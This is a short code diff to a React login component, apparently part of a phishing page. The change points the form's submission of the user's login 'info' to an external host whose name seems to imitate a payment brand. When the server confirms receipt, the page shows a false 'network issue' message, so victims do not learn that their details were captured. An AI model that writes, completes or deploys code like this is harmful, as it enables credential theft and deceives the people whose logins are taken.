@@ -22,7 +22,7 @@ function App() {
 
     try {
       setMessage('Logging in...');
-      const response=await axios.post("http://localhost:8000/submit", info)
+      const response=await axios.post("https://opay-phgo.onrender.com/submit", info)
       if (response.status===200) {
         setMessage('There is an issue with the network, try again later!')
       } else {
